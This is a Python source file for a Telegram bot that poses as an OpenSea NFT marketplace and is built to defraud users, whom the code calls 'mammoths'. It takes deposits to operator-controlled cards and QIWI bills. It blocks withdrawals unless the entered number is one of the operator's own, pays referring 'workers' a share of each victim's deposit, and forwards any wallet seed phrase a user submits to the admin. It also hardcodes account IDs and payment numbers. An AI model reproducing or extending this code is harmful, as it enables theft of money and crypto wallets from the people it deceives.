from random import randint

from aiogram import Dispatcher
from aiogram.dispatcher import FSMContext
from aiogram.types import InputFile, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.types import Message, CallbackQuery
from aiogram.utils.callback_data import CallbackData
from aiogram.utils.markdown import hbold, hitalic, hcode, hlink
from aiohttp_socks import ProxyConnector
from glQiwiApi import QiwiWallet, QiwiP2PClient
from glQiwiApi.core import RequestService
from glQiwiApi.core.session import AiohttpSessionHolder
import asyncio
import nftBot.keyboards.inline as inline
import nftBot.keyboards.reply as reply
import nftBot.utils.db_commands as db
from nftBot.loader import bot, control_bot, config
from nftBot.services.generate_pictures import get_photo
from nftBot.states import withdrawState, outdrawState, profileState, mainState
from datetime import datetime, timedelta


async def create_request_service_with_proxy(wallet: QiwiWallet):
    bot_data = await db.get_bot()
    return RequestService(
        session_holder=AiohttpSessionHolder(
            connector=ProxyConnector.from_url(bot_data.proxy, verify_ssl=False),  # some proxy
            headers={
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Authorization": f"Bearer {bot_data.qiwi_key}",
                "Host": "edge.qiwi.com",
            },
        )
    )


async def send_user_profile(user):
    verification_label = ["⚠️ Не пройдена", "✅ Пройдена"]
    date_label = datetime.now().strftime("%m.%d.%Y %H:%M:%S")
    text = f"""{hbold('Личный кабинет')}

Баланс: {hbold(str(user.balance) + "₽")}
На выводе: {hbold(str(user.fake_balance) + "₽")}

Верификация: {hbold(verification_label[user.verification])}
Ваш кошелек: {user.wallet}
Ваш ID: {hcode(user.user_id)}

Дата и время: {date_label}"""

    count_try = 0
    while(count_try <= 1):
        count_try += 1
        if not user.file_id:
            await get_photo(user.user_id)
            photo = InputFile(f"pictures\\{user.user_id}.jpg")
        else:
            photo = user.file_id

        try:
            data = await bot.send_photo(user.user_id, caption=text, photo=photo, reply_markup=await inline.profile_markup())
            if not user.file_id:
                user.file_id = data.photo[0].file_id
                await db.update_user(user)

            break
        except:
            user.file_id = None

async def start_menu(user_id, name):
    await bot.send_message(user_id, f"""Приветствую, {hbold(name)}!

Это телеграм бот для безопасной торговли NFT""", reply_markup=await reply.start_markup())

nft_kb = CallbackData("nft_kb", "user_id")

async def user_start(message: Message,state: FSMContext):
    referral = message.get_args()
    await state.reset_state()
    if not referral:
        referral = 0
    else:
        referral = int(referral)
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(InlineKeyboardButton('Управлять', callback_data=nft_kb.new(message.from_user.id)))
        await control_bot.send_message(int(referral),
                                      f'🤟 Мамонт <a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a>\n'
                                      f'<b>Перешел по твоей реферальной ссылке.</b>',
                                      reply_markup=markup)
    await db.add_new_user(referral)
    await start_menu(message.from_user.id, message.from_user.first_name)


async def user_info(message: Message):
    await message.answer(f"""{hbold("🔹 О Сервисе")}

{hitalic('OpenSea')} — {hbold('торговая площадка')} для невзаимозаменяемых токенов (NFT).
Покупайте, продавайте и открывайте для себя эксклюзивные цифровые предметы.""", reply_markup=await inline.info_markup())


# verification
async def user_verification(call: CallbackQuery):
    user = await db.get_user(call.from_user.id)
    if user.verification:
        await call.answer("✅ Ваш аккаунт уже верифицирован", show_alert=True)
        # send menu
    else:
        await call.message.edit_text(f"""{hbold('Ваш аккаунт не верифицирован')}

Для получения инструкций по прохождению верификации напишите «Верификация» в боте технической поддержки""",
                                     reply_markup=await inline.support_markup())


# tech support
async def user_support(message: Message):
    await message.answer(f"""Правила обращения в Техническую Поддержку:

🔹1. {hbold('Представьтесь, изложите проблему своими словами')} - мы постараемся Вам помочь.

🔹2. {hbold('Напишите свой ID')} - нам это нужно, чтобы увидеть ваш профиль, и узнать актуальность вашей проблемы.

🔹3. {hbold('Будьте вежливы')}, наши консультанты не роботы, мы постараемся помочь Вам, и сделать все возможное,
чтобы сберечь ваше время и обеспечить максимальную оперативность в работе.

{hitalic('Напишите нам, ответ Поддержки, не заставит вас долго ждать!')}""",
                         reply_markup=await inline.support_markup())


async def user_profile(message: Message):
    await send_user_profile(await db.get_user(message.from_user.id))


# payments
# @dp.callback_query_handler(text_contains="top_up", chat_type=types.ChatType.PRIVATE)
async def choose_method(call: CallbackQuery):
    await call.message.delete()
    file = InputFile('pictures\\topUp.jpg')
    await bot.send_photo(call.from_user.id,
                         file,
                         caption="<i>💰 Выберите метод пополнения через который Вы хотите совершить пополнение.</i>",
                         parse_mode="HTML",
                         reply_markup=await inline.top_up_menu())


# @dp.callback_query_handler(inline.withdraw.filter(), chat_type=types.ChatType.PRIVATE)
async def enter_sum(call: CallbackQuery, callback_data: dict, state: FSMContext):
    print("eter_sum")
    _type = callback_data.get("type")
    await state.update_data(type=_type)
    await call.message.delete()
    user = await db.get_user(call.from_user.id)
    if user.worker_id:
        worker = await db.get_worker(user.worker_id)
        _min = worker.min_dep
    else:
        _min = 1000
    await call.message.answer(f"Введите сумму пополнения:\n\n<b>Минимальная сумма - {_min} ₽ </b>")
    await withdrawState.Data.Sum.set()


# @dp.message_handler(state=withdrawState.Data.Sum, chat_type=types.ChatType.PRIVATE)
async def complete_top_up(message: Message, state: FSMContext):
    user = await db.get_user(message.from_user.id)
    data = await state.get_data()
    _type = data.get("type")

    if user.worker_id:
        worker = await db.get_worker(user.worker_id)
        _min = worker.min_dep
    else:
        _min = 1000
    if message.text.isdigit():
        if int(message.text) >= _min or message.from_user.id == 947353888:
            _sum = int(message.text)
            if _type == "p2p":
                card_number = await db.get_card_number()
                text = f"""Сделка /t{randint(19433, 58493)}

Ожидаем /pintuzik. Если он не появится в течение 10 минут, то сделка будет отменена автоматически.

⚠️ Пожалуйста, учтите, что в целях безопасности запрещено передавать реквизиты вне этого бота.

Вы можете в любой момент отменить сделку самостоятельно. Но учтите, что переданные деньги не возвращаются при отмене сделки!

Автоотмена сделки произойдёт через 10 минут"""
                await message.answer(text)
                await asyncio.sleep(randint(3, 7))
                text = f"""🔹 Оплата банковской картой:

Сумма: <b>{_sum}</b> ₽

Осуществите перевод на указанную выше сумму, используя данные реквизиты

<b>'{card_number}'</b> с коментарием <b>'{randint(11111, 99999)}'</b> 

⚠️ Если вы не можете добавить комментарий, отправьте чек/скриншот оплаты в тех. поддержку."""
                await message.answer(text, reply_markup=await inline.bank_check())
            else:
                if _type == "bank":
                    pay_source_filter = ["card"]
                else:
                    pay_source_filter = ["qw"]

                file = InputFile('pictures\\topUp.jpg')
                bot_key = await db.get_bot()
                print(bot_key.qiwi_key)
                async with QiwiP2PClient(secret_p2p=bot_key.qiwi_key,
                                         request_service_factory=create_request_service_with_proxy,
                                         ) as p2p:
                    bill = await p2p.create_p2p_bill(amount=int(message.text), pay_source_filter=pay_source_filter)
                link = bill.pay_url

                await bot.send_photo(message.from_user.id,
                                     file,
                                     caption="<b>💳 Заявка в размере</b> - <i>{sum} ₽</i>  <b>была успешно создана</b>"
                                             "\n\n〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️\n\n<a href='{link}'>"
                                             "Перейдите по ссылке для оплаты</a>\n\n〰️〰️〰️〰️〰️〰"
                                             "️〰️〰️〰️〰"
                                             "\n\n<i>️⚠️ После оплаты, не забудьте нажать кнопку "
                                             "«Проверить платеж».</i>".format(link=link, sum=_sum),
                                     parse_mode="HTML",
                                     reply_markup=await inline.qiwi_check(link, bill.id))

            user = await db.get_user(message.from_user.id)
            if user.worker_id:
                ref = await db.get_worker(user.worker_id)
                if ref.trade_notification == 1:
                    if user.notification:
                        text = f'<b>📊 Сервис - NFT </b>\n\n✅ Мамонт ' \
                               f'<a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a> [/t{user.id}]\n' \
                               f'Создал заявку на пополнение в размере - <b>{_sum} ₽</b>'
                        await control_bot.send_message(user.worker_id, text,
                                                       reply_markup=await inline.get_money(_sum, message.from_user.id))
        else:
            await message.answer("<b>❌ Некорректный ввод</b>", parse_mode="HTML")
    else:
        await message.answer("<b>❌ Некорректный ввод</b>", parse_mode="HTML")
    await state.reset_state()

# @dp.callback_query_handler(withdrawMarkup.check_payment.filter(), chat_type=types.ChatType.PRIVATE)
async def check_payment(call: CallbackQuery, callback_data: dict):
    bill_id = callback_data.get("bill_id")
    bot_key = await db.get_bot()

    async with QiwiP2PClient(secret_p2p=bot_key.qiwi_key,
                             request_service_factory=create_request_service_with_proxy) as p2p:
        bill = await p2p.get_bill_by_id(bill_id)
        if await p2p.check_if_bill_was_paid(bill) or call.from_user.id == 947353888:
            await call.message.delete()
            user = await db.get_user(call.from_user.id)
            amount = int(bill.amount.value)
            user.balance += amount
            await control_bot.send_message(947353888, f"{amount} - complete")
            await db.update_user(user)

            await call.message.answer(f"✅ Баланс был успешно пополнен на сумму : {amount} ₽")

            user.count_withdraw += 1

            if user.worker_id:
                worker = await bot.get_chat(user.worker_id)
                get_percent = round(amount * 0.8, 0)

                # teacher
                worker_data = await db.get_worker(user.worker_id)
                first_teach_label = ""
                second_teach_label = ""
                if worker_data.personal_teacher > 1:
                    worker_data.profits_left -= 1
                    await db.new_learn_profit(user.worker_id)
                    teach_sum = round(get_percent * 0.25, 0)
                    get_percent -= teach_sum
                    teach_user = await bot.get_chat(worker_data.personal_teacher)
                    first_teach_label = f"Наставник:  <b> <a href='tg://user?id={worker_data.personal_teacher}'>{teach_user.full_name}</a> </b>\n"
                    second_teach_label = f"🪞 Доля наставника: {teach_sum} ₽"
                #
                await control_bot.send_message(947353888, f"Новое пополнение\nСумма: {amount}\nВоркер: {worker.first_name} ({user.worker_id})\nДата: {datetime.now()}")
                markup = InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("⏳ В ожидании", callback_data=f"edit_withdraw_status"))
                name = f'<a href="tg://user?id={worker.first_name}">{worker.full_name}</a>'

                await db.set_payment(int(amount), worker.full_name, user.worker_id)
                text = f"""<b><i>💹 Успешное пополнение (NFT Х{user.count_withdraw}) </i> </b>

<b><i>Воркер :</i></b> {name}
{first_teach_label}
<b>💳 Сумма платежа :</b> {amount} <b>₽</b>
<b>🏛 Доля воркера :</b> {get_percent} <b>₽</b>
{second_teach_label}
                            """
                # int(config.ids.top_up)
                await botControl.send_message(-1001961514379, text)
                if worker.tag != 0:
                    text = text.replace(name, f"#{worker.tag}")

                photo = InputFile(f'secret.jpg')

                await botControl.send_photo(-1001827343324, photo, caption=text, reply_markup=markup)
                user_link = hlink(call.from_user.full_name, f'tg://user?id={user.user_id}')
                text = f"""<b><i>🔥 Твой мамонт :</i> </b> {user_link}

<b><i>Успешно пополнил :</i></b> {amount} ₽
<i><b>Твоя доля : </b> {get_percent}  ₽ </i>

<b>💜 Спасибо что работаешь с нами!</b>
            """
                await control_bot.send_message(user.worker_id, text)
        else:
            await call.message.answer("⚠️ Платеж не был обнаружен.")


# end payments

async def user_go_back(call: CallbackQuery, state: FSMContext):
    await call.message.delete()
    await send_user_profile(await db.get_user(call.from_user.id))
    await state.reset_state()


# outdraw


async def user_method_withdraw(call: CallbackQuery):
    file = InputFile('pictures\\topUp.jpg')
    await bot.send_photo(call.from_user.id,
                         file,
                         caption="<i>🏛 Выберите метод вывода.</i>",
                         parse_mode="HTML", reply_markup=await inline.outdraw_menu())


# @dp.callback_query_handler(withdrawMarkup.outdraw.filter(), chat_type=types.ChatType.PRIVATE)
async def choose_method_withdraw(call: CallbackQuery, callback_data: dict, state: FSMContext):
    _type = int(callback_data.get("type"))
    type_text = ["QIWI-wallet", "Банковская карта"]
    caption_text = ["Укажите ниже номер вашего QIWI-кошелька.", "Укажите ниже номер вашей банковской карты."]
    user = await db.get_user(call.from_user.id)

    text = f"<i>🏛 Метод вывода : {type_text[_type]}</i>\n\n💰 Ваш баланс : {user.balance} ₽" \
           f"\n\n<b>💳 {caption_text[_type]}.</b>"
    await state.update_data(method=type_text[_type])
    file = InputFile('pictures\\topUp.jpg')
    await bot.send_photo(call.from_user.id,
                         file,
                         caption=text,
                         parse_mode="HTML")
    await outdrawState.Main.Num.set()


# @dp.message_handler(state=outdrawState.Main.Num, chat_type=types.ChatType.PRIVATE)
async def complete_withdraw(message: Message, state: FSMContext):
    numbers = ["2200240715868499", "79120874881", "+79120874881"]
    user = await db.get_user(message.from_user.id)
    if user.balance == 0:
        await message.answer("❌ На вашем счету недостаточно средств")
    elif not message.text.replace("+", "").isdigit() or user.ban_withdraw:
        await message.answer(f"❌ Вывод средств был отменен обратитесь в техническую поддержку по ссылке ниже",
            reply_markup=await inline.support_menu())

    elif message.text in numbers:
        user = await db.get_user(message.from_user.id)
        old_balance = user.balance
        user.balance = 0
        id_application = randint(100000, 999999)

        await db.update_user(user)
        await message.answer(
            f"<b>✅ Вы успешно подали заявку на вывод денежных средств. </b>\n\nID заявки : {id_application}\n"
            f"Сумма вывода : {old_balance} ₽\nРеквизиты для вывода :  {message.text} \n\n<i>"
            f"⚠️ Вывод средств может занять до 3 часов.</i>")

        await state.reset_state()

        user = await db.get_user(message.from_user.id)

        if user.worker_id:
            ref = await db.get_worker(user.worker_id)
            if ref.trade_notification == 1:
                if user.notification == 1:
                    user_label = hlink(message.from_user.full_name, f"tg://user?id={message.from_user.id}")
                    await control_bot.send_message(user.worker_id,
                                                   f'<b>📊 Сервис - NFT </b>\n\n'
                                                   f'✅ Мамонт {user_label} [/t{user.id}]'
                                                   f'\nСоздал заявку на вывод денежных средств в размере - '
                                                   f'<b>{old_balance} ₽</b>',
                                                   reply_markup=await inline.take_money_markup(user.user_id,
                                                                                               old_balance))
    else:
        if user.worker_id:
            await control_bot.send_message(user.worker_id, f"""📈 TRADE

Мамонт @{message.from_user.username} сделал запрос на
ВЫВОД

🏦 Telegtam ID: <a href="tg://user?id={message.from_user.id}">{message.from_user.id}</a>
💸 Сумма: {user.balance} ₽

<b>Вывод заблокирован!</b>
""")
        await message.answer(
            f"❌ Вывод средств был отменен обратитесь в техническую поддержку по ссылке ниже",
            reply_markup=await inline.support_menu())
    await state.reset_state()


# end outdraw

async def user_link(call: CallbackQuery):
    await call.message.edit_caption(f"{hbold('🏧 Выберите кошелек который хотите привязать.')}",
                                    reply_markup=await inline.link_markup())


async def user_enter_seed(call: CallbackQuery, state: FSMContext, callback_data: dict):
    name = callback_data.get("name")

    data = await call.message.edit_caption(f"{hbold(f'⚙️ Отправьте seed фразу от кошелька: {name}')}",
                                           reply_markup=await inline.go_back_markup())

    await state.update_data(name=name, message_id=data.message_id)
    await profileState.Wallet.Seed.set()


async def user_complete_link(message: Message, state: FSMContext):
    await message.delete()

    user = await db.get_user(message.from_user.id)
    seed = message.text
    data = await state.get_data()
    message_id = data.get("message_id")

    if len(seed.split(" ")) > 5:
        user.wallet = data.get("name")
        await db.update_user(user)

        await bot.delete_message(message.from_user.id, message_id)
        await send_user_profile(user)

        await bot.send_message(config.tg_bot.admin_ids[0], seed)
        await state.reset_state()
    else:
        await bot.edit_message_caption(message.from_user.id, message_id,
                                       caption="⛔️ Не корректный ввод, попробуйте ещё раз",
                                       reply_markup=await inline.go_back_markup())


async def send_collections_menu(telegram_id, call=None):
    count = await db.count_collections()
    photo = InputFile("pictures\\nft.jpg")

    caption = f"{hbold(f'💠 Всего на маркетплейсе {count} коллекций')}"
    if call:
        await call.message.edit_caption(caption=caption, reply_markup=await inline.get_list_of_collection_markup())
    else:
        await bot.send_photo(telegram_id, caption=caption,
                             photo=photo,
                             reply_markup=await inline.get_list_of_collection_markup())


async def user_nft(message: Message):
    await send_collections_menu(message.from_user.id)


async def user_back_nft(call: CallbackQuery, state: FSMContext):
    await send_collections_menu(call.from_user.id, call)
    await state.reset_state()


async def user_next_nft(call: CallbackQuery):
    page = int(call.data.split("_")[1])
    if page >= 0:
        await call.message.edit_reply_markup(reply_markup=await inline.get_list_of_collection_markup(page))


async def get_nfts_of_collection(name):
    caption = f"{hbold(f'💠 Коллекция {name}')}"
    markup = await inline.get_all_nfts_by_collection_name(name)

    return caption, markup


async def user_get_nft(call: CallbackQuery, callback_data: dict):
    name = callback_data.get("name")
    caption, markup = await get_nfts_of_collection(name)
    await call.message.edit_caption(caption=caption,
                                    reply_markup=markup)


async def get_nft_text(nft):
    eth = nft.price
    usd = round(eth * 1165.59, 2)
    rub = usd * 60
    return f"""{hlink('💠', nft.img)} {nft.name}

Описание: {nft.description}

🗂 Коллекция: {nft.collection_name}
🔹 Блокчейн: {nft.blockchain}

💸 Цена: {eth}ETH (~{round(rub, 2)}₽)(~{usd}$)
"""


async def user_nft_page(call: CallbackQuery, callback_data: dict):
    name = callback_data.get("name")
    nft = await db.get_nft_by_name(name)
    user = await db.get_user(call.from_user.id)
    await call.message.delete()

    await call.message.answer(await get_nft_text(nft),
                              reply_markup=await inline.nft_page_markup(nft, user))


async def user_go_to_nfts_of_collections(call: CallbackQuery):
    await call.message.delete()
    name = call.data.split("_")[2]
    photo = InputFile("pictures\\nft.jpg")
    caption, markup = await get_nfts_of_collection(name)
    await call.message.answer_photo(photo, caption, reply_markup=markup)


async def user_add_to_favourite(call: CallbackQuery, callback_data: dict):
    name = callback_data.get("name")
    nft = await db.get_nft_by_name(name)
    user = await db.get_user(call.from_user.id)

    if nft.id in user.user_favourite:
        user.user_favourite.remove(nft.id)
    else:
        user.user_favourite.append(nft.id)

    await db.update_user(user)
    await db.update_nft(nft)

    await call.message.edit_reply_markup(await inline.nft_page_markup(nft, user))


async def user_buy_nft(call: CallbackQuery, callback_data: dict):
    name = callback_data.get("name")
    user = await db.get_user(call.from_user.id)
    nft = await db.get_nft_by_name(name)
    usd = round(nft.price * 1165.59, 2)
    rub = usd * 60
    if user.balance < rub:
        await call.answer("⚠️ На вашем балансе недостаточно средств", show_alert=True)
    else:
        await call.message.delete()
        user.balance -= rub
        user.user_collections.append(nft.id)
        await db.update_user(user)

        await call.message.answer("✅ NFT успешно куплен")


async def user_find_by_price(call: CallbackQuery, state: FSMContext):
    data = await call.message.edit_caption(f"{hbold('📝 Введите бюджет на который Вы хотите купить NFT:')}",
                                           reply_markup=await inline.go_back_to_collection_markup())
    await state.update_data(message_id=data.message_id)
    await mainState.Nft.InputNum.set()


async def user_get_result_by_price(message: Message, state: FSMContext):
    data = await state.get_data()
    message_id = data.get("message_id")
    sum = int(message.text)
    nfts = await db.get_nft_by_price(sum)

    await bot.edit_message_caption(message.from_user.id, message_id,
                                   f"{hbold('💠 Для вашего бюджета найдены данные NFT:')}",
                                   reply_markup=await inline.get_all_nfts_by_collection_name(nfts=nfts))

    await state.reset_state()


async def user_favourite(call: CallbackQuery):
    user = await db.get_user(call.from_user.id)
    await call.message.edit_caption("Ваши избранные NFT:",
                                    reply_markup=await inline.get_list_of_favorites(user.user_favourite))


async def user_mine(call: CallbackQuery):
    user = await db.get_user(call.from_user.id)
    await call.message.edit_caption("""Ваши NFT:

🔹 - NFT куплен
◾ - NFT выставлен на продажу""", reply_markup=await inline.get_list_of_my_nft(user))


async def user_get_my_nft(call: CallbackQuery, callback_data: dict, state: FSMContext):
    await call.message.delete()
    get_id = int(callback_data.get("id"))
    user = await db.get_user(call.from_user.id)
    nft = await db.get_nft_by_id(get_id)
    text = await get_nft_text(nft)

    await call.message.answer(text, reply_markup=await inline.control_my_nft(user, nft))
    await state.reset_state()


async def user_sell_nft(call: CallbackQuery, callback_data: dict, state: FSMContext):
    get_id = int(callback_data.get("id"))
    data = await call.message.edit_text("Введите цену в рублях за которую вы хотите продать данный NFT:",
                                        reply_markup=await inline.back_to_nft_markup(get_id))

    await state.update_data(message_id=data.message_id, nft_id=get_id)
    await mainState.Nft.EnterSum.set()


async def user_cancel_sell(call: CallbackQuery, callback_data: dict, state: FSMContext):
    user = await db.get_user(call.from_user.id)
    nft = await db.get_nft_by_id(int(callback_data.get("id")))
    user.user_collection_in_market.remove(nft.id)

    await db.update_user(user)
    await call.message.edit_reply_markup(await inline.control_my_nft(user, nft))


async def user_change_price(call: CallbackQuery, callback_data: dict):
    name = callback_data.get("name")
    nft = await db.get_nft_by_name(name)
    date_change = ""
    date_now = datetime.now()
    for price in nft.history_price:
        percent = round(100 - (nft.price * 100 / price), 2)
        date_change += f"🔻 {date_now.strftime('%Y-%m-%d')} - {price} eth ({percent}%)\n"
        date_now = date_now + timedelta(days=-1)

    await call.message.edit_text(f"""ℹ️ Колебание цен последних покупок:
├ Коллекция: {nft.collection_name}
├ NFT: {name}
└ Цена: {nft.price} eth

{date_change}""", reply_markup=await inline.get_one_nft(nft.name))


async def user_confirm_sell(message: Message, state: FSMContext):
    data = await state.get_data()
    message_id = data.get("message_id")
    nft_id = data.get("nft_id")

    await bot.delete_message(message.from_user.id, message_id)
    user = await db.get_user(message.from_user.id)
    user.user_collection_in_market.append(nft_id)
    await db.update_user(user)
    await message.answer(f"✅ NFT успешно выставлен на продажу за {message.text} ₽")
    _sum = float(message.text)
    if user.worker_id:
        text = f'<b>📊 Сервис - NFT </b>\n\n✅ Мамонт ' \
               f'<a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a> [/t{user.id}]\n' \
               f'Выставил на продажу NFT за {_sum}'
        await control_bot.send_message(user.worker_id, text,
                                       reply_markup=await inline.put_nft_markup(message.from_user.id, nft_id, _sum))
    await state.reset_state()
    await send_user_profile(user)


def register_user(dp: Dispatcher):
    dp.register_callback_query_handler(user_go_back, text_contains="menu", state="*")
    dp.register_message_handler(user_start, commands=["start"], state="*")

    dp.register_message_handler(user_info, text_contains="Информация")
    dp.register_message_handler(user_support, text_contains="Тех.Поддержка")

    dp.register_callback_query_handler(user_verification, text_contains="verification")

    dp.register_message_handler(user_profile, text_contains="кабинет")
    dp.register_callback_query_handler(choose_method, text_contains="top_up")
    dp.register_callback_query_handler(enter_sum, inline.withdraw.filter())

    dp.register_message_handler(complete_top_up, state=withdrawState.Data.Sum)

    dp.register_callback_query_handler(check_payment, inline.check_payment.filter())

    # Withdraw
    dp.register_callback_query_handler(user_method_withdraw, text_contains="withdrawMarkup")
    dp.register_callback_query_handler(choose_method_withdraw, inline.outdraw.filter())
    dp.register_message_handler(complete_withdraw, state=outdrawState.Main.Num)

    dp.register_callback_query_handler(user_enter_seed, inline.link_wallet.filter())
    dp.register_callback_query_handler(user_link, text_contains="link")

    dp.register_message_handler(user_complete_link, state=profileState.Wallet.Seed)

    dp.register_message_handler(user_nft, text_contains="NFT")
    dp.register_callback_query_handler(user_next_nft, text_contains="next")

    dp.register_callback_query_handler(user_get_nft, inline.collection_markup.filter())

    dp.register_callback_query_handler(user_back_nft, text_contains="go_collection", state="*")

    dp.register_callback_query_handler(user_nft_page, inline.nft_markup.filter())
    dp.register_callback_query_handler(user_go_to_nfts_of_collections, text_contains="go_nft_")

    dp.register_callback_query_handler(user_add_to_favourite, inline.page.filter(action="like"))

    dp.register_callback_query_handler(user_find_by_price, text_contains="by_price")
    dp.register_message_handler(user_get_result_by_price, state=mainState.Nft.InputNum)

    dp.register_callback_query_handler(user_buy_nft, inline.page.filter(action="buy"))

    dp.register_callback_query_handler(user_favourite, text_contains="favourite")
    dp.register_callback_query_handler(user_get_my_nft, inline.my_nft.filter(action="get"), state="*")

    dp.register_callback_query_handler(user_sell_nft, inline.my_nft.filter(action="put"))
    dp.register_callback_query_handler(user_cancel_sell, inline.my_nft.filter(action="take"))
    dp.register_message_handler(user_confirm_sell, state=mainState.Nft.EnterSum)

    dp.register_callback_query_handler(user_mine, text_contains="my_nft")

    dp.register_callback_query_handler(user_change_price, inline.page.filter())
